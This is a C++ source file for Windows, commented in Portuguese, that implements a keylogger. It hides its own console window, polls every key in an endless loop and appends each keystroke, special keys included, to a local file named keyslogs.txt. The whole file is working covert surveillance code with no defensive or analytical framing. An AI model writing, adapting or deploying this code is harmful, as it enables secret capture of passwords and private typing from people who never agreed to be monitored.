#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <algorithm>
#include <cctype>

// Caminho do arquivo de log
#define LOG_FILE "keyslogs.txt"

// Salvar dados em arquivo de log
void SaveData(std::string data){
    std::ofstream log_file;

    // Abrir o arquivo
    log_file.open(LOG_FILE, std::ios::app);

    // Grava dados no arquivo de log
    if (log_file.is_open()) {
        log_file << data;
        log_file.close();
    }
}

// Converte teclas especiais int para string
std::string converteTeclasEspeciais(int key){
    std::string resultado;

    switch(key){
    case VK_SPACE:
        resultado = " ";
        break;
    case VK_RETURN:
        resultado = "\n";
        break;
    case VK_CAPITAL:
        resultado = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        resultado = "[SHIFT]";
        break;
    case VK_TAB:
        resultado = "[TAB]";
        break;
    case VK_CONTROL:
        resultado = "[CTRL]";
        break;
    case VK_MENU:
        resultado = "[ALT]";
        break;
    case VK_BACK:
        resultado = "[BACKSPACE]";
        break;
    default:
        break;
    }

    return resultado;
}


int main(){

    // Declara as teclas especiais
    int special_keys[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_MENU, VK_CAPITAL};
    std::string special_keychar;
    bool isSpecialKey;
    
    // Esconde o terminal do Windows
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
    }

    // Loop infinito
    while(1){
        // Loop para percorrer cada tecla
        for(int key = 8; key <= 190; key++){
            // Checa se a tecla eh pressionada
            if(GetAsyncKeyState(key) == -32767){
                // Tecla pressionada
                // Checa se tecla eh uma tecla especial
                isSpecialKey = false;
                for(int sk : special_keys) {
                    if(key == sk) {
                        isSpecialKey = true;
                        break;
                    }
                }

                if(isSpecialKey){
                    // Esta eh uma tecla especial. precisamos traduzir
                    special_keychar = converteTeclasEspeciais(key);
                    SaveData(special_keychar);
                } else {
                    // Esta nao eh uma tecla especial. precisamos verificar se eh maiuscula ou minuscula
                    if(GetKeyState(VK_CAPITAL) & 0x0001){
                        // CAPSLOCK Ativado
                        SaveData(std::string(1, (char)key));
                    } else{
                        // CAPSLOCK Desativado
                        // Transforme o caractere em minusculo antes de salvar
                        SaveData(std::string(1, (char)std::tolower(key)));
                    }
               }
            }
        }
        Sleep(10); // Adiciona um pequeno sleep para nao consumir 100% da CPU
    }
    return 0;
}
